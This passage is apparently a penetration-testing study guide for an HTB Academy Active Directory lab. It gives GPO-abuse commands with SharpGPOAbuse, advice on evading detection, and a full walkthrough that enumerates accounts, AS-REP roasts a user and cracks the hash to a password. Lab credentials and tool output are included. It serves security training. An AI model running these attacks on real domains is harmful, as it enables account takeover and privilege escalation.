- **Affected systems**: Identify which OUs and computers are impacted
- **Attack path planning**: Determine best GPO targets for specific goals
- **Permission visualization**: Understand complex permission structures

### **GPO Exploitation Tools**

#### **SharpGPOAbuse**
```powershell
# Add user to local administrators group
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount "DOMAIN\user" --GPOName "Target GPO"

# Create immediate scheduled task
SharpGPOAbuse.exe --AddImmediateTask --TaskName "Evil Task" --Command "cmd.exe" --CommandArguments "/c evil_command" --GPOName "Target GPO"

# Add user rights assignment
SharpGPOAbuse.exe --AddUserRights --UserRights "SeDebugPrivilege" --UserAccount "DOMAIN\user" --GPOName "Target GPO"
```

#### **OPSEC Considerations**
- **Scope awareness**: GPO changes affect ALL computers in linked OUs
- **Detection risk**: GPO modifications often logged and monitored
- **Rollback procedures**: Plan for reverting changes post-exploitation
- **Target selection**: Choose GPOs with limited scope when possible

---

## 🎯 **HTB Academy Lab Solutions**

### **Lab Environment Details**
- **Target Host**: RDP to target with `htb-student:Academy_student_AD!`
- **Windows Attack Host**: MS01 for Windows-based tools
- **Linux Access**: SSH to `172.16.5.225` with `htb-student:HTB_@cademy_stdnt!`

### **🔍 Question 1: "Find another user with the passwd_notreqd field set. Submit the samaccountname as your answer. The samaccountname starts with the letter 'y'."**

#### **Complete Solution Walkthrough:**

**Step 1: RDP Connection to Target**
```bash
# Connect to target system
xfreerdp /v:10.129.149.107 /u:htb-student /p:Academy_student_AD!

# Certificate details for 10.129.149.107:3389 (RDP-Server):
# Common Name: ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
# Click "OK" on Computer Access Policy message
```

**Step 2: PowerShell Preparation**
```powershell
# Close Server Manager, run PowerShell as Administrator
# Navigate to tools directory and import PowerView
cd C:\Tools\
Import-Module .\PowerView.ps1
```

**Step 3: PASSWD_NOTREQD Enumeration**
```powershell
# Search for users with PASSWD_NOTREQD flag
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

# Lab output:
samaccountname                                                           useraccountcontrol
--------------                                                           ------------------
guest                  ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
mlowe                                  PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
ygroce               PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
ehamilton                              PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
$725000-9jb50uejje9f                         ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
nagiosagent                                                  PASSWD_NOTREQD, NORMAL_ACCOUNT
```

**🎯 Answer: `ygroce`**

**Analysis**: The user `ygroce` has both PASSWD_NOTREQD and DONT_REQ_PREAUTH flags set, making it vulnerable to multiple attack vectors.

### **🎫 Question 2: "Find another user with the 'Do not require Kerberos pre-authentication setting' enabled. Perform an ASREPRoasting attack against this user, crack the hash, and submit their cleartext password as your answer."**

#### **Complete Solution Walkthrough:**

**Step 1: Enumerate Users with Pre-Authentication Not Required**
```powershell
# Using same RDP connection from Question 1
# Find users with DONT_REQ_PREAUTH flag
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

# Lab output:
samaccountname     : ygroce
userprincipalname  : ygroce@inlanefreight.local
useraccountcontrol : PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH

samaccountname     : mmorgan
userprincipalname  : mmorgan@inlanefreight.local
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
```

**Step 2: AS-REP Hash Extraction with Rubeus**
```powershell
# Target the ygroce user for ASREPRoasting
.\Rubeus.exe asreproast /user:ygroce /nowrap /format:hashcat

# Lab output:
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: AS-REP roasting
[*] Target User            : ygroce
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=ygroce))'
[*] SamAccountName         : ygroce
[*] DistinguishedName      : CN=Yolanda Groce,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
[*] Using domain controller: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL (172.16.5.5)
[*] Building AS-REQ (w/o preauth) for: 'INLANEFREIGHT.LOCAL\ygroce'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:
$krb5asrep$23$ygroce@INLANEFREIGHT.LOCAL:E3B8FCAB0E3905D4678B190116218DCA$F297B10A7C0E3FF100FB35E758FE164DE662539937C77F197DFDA15884F4095DB9E5BB7AFE3C8F2D49D72EC53BCCF0B48D02BB7A51A99142BE23372910F99BE6ECF2C6227ED0E31A9AD4DB28B395CF8EA90DD1B3F87324227872AF5DCB2E4CD5527B006DDA4A2434877094505494B286260CCB3DA4E085E6F7C57FB07EC223922DA0591DB76B4ED30BADFB39CBF7B1F1EBA5267B633FAD71BA2CDF252BBA41EA7B602FCA3D860FDFEA639695F7A4F09B79EA08D225F37DB67F857180B096E0E00DFD240FE8D01E67E40C8DD2E05DED3E164C84DEF8134188E7597F86D9EA1E9CC48FDA29C2F0853453904EF8A7A7D940B2D8201DA101FE50B2CC
```

**Step 3: Hash Cracking with Hashcat**
```bash
# Save hash to file in Pwnbox/PMVPN
# Create hash.txt with the extracted AS-REP hash
# Use Hashcat mode 18200 for Kerberos 5 AS-REP etype 23

hashcat -m 18200 hash.txt -w 3 -O /usr/share/wordlists/rockyou.txt

# Lab output (successful crack):
hashcat (v6.1.1) starting...

$krb5asrep$23$ygroce@INLANEFREIGHT.LOCAL:e3b8fcab0e3905d4678b190116218dca$f297b10a7c0e3ff100fb35e758fe164de662539937c77f197dfda15884f4095db9e5bb7afe3c8f2d49d72ec53bccf0b48d02bb7a51a99142be23372910f99be6ecf2c6227ed0e31a9ad4db28b395cf8ea90dd1b3f87324227872af5dcb2e4cd5527b006dda4a2434877094505494b286260ccb3da4e085e6f7c57fb07ec223922da0591db76b4ed30badfb39cbf7b1f1eba5267b633fad71ba2cdf252bba41ea7b602fca3d860fdfea639695f7a4f09b79ea08d225f37db67f857180b096e0e00dfd240fe8d01e67e40c8dd2e05ded3e164c84def8134188e7597f86d9ea1e9cc48fda29c2f0853453904ef8a7a7d940b2d8201da101fe50b2cc:Pass@word
```

**🎯 Answer: `Pass@word`**

**Analysis**: The user `ygroce` has both vulnerability flags (PASSWD_NOTREQD and DONT_REQ_PREAUTH) set, allowing for multiple attack vectors. The ASREPRoasting attack successfully extracted the AS-REP hash which was cracked to reveal the weak password "Pass@word".

---

## 📊 **Key Takeaways**

### **Technical Mastery Achieved**
1. **Diverse Attack Vectors**: Proficiency with numerous AD misconfiguration types
2. **Legacy Vulnerability Exploitation**: GPP passwords, ASREPRoasting, MS14-068
3. **Administrative Oversight Discovery**: Password fields, SYSVOL scripts, DNS records
4. **Group Policy Abuse**: Understanding GPO security model and exploitation techniques

### **Professional Skills Developed**
- **Comprehensive Assessment**: Ability to find obscure misconfigurations others miss
- **Historical Vulnerability Knowledge**: Understanding of legacy AD security issues
- **Client Communication**: Explaining diverse findings with appropriate risk ratings
- **Remediation Guidance**: Providing actionable fixes for various misconfiguration types

### **Attack Methodology Excellence**
```
Standard Enumeration → Miscellaneous Discovery → Exploitation → Comprehensive Coverage
   (Known Techniques)    (Hidden Findings)      (Diverse Methods)   (Complete Assessment)
```

### **Defensive Insights**
- **Administrative Training**: Importance of secure AD administration practices
- **Legacy Cleanup**: Need to remove old GPP passwords and unused accounts
- **Configuration Reviews**: Regular audits of user account flags and GPO permissions
- **Monitoring Requirements**: Detection strategies for unusual authentication patterns

**🔑 Complete mastery of miscellaneous Active Directory misconfigurations - from Exchange vulnerabilities through legacy features to administrative oversights - representing comprehensive enterprise penetration testing capabilities for discovering hidden attack vectors!**

--- 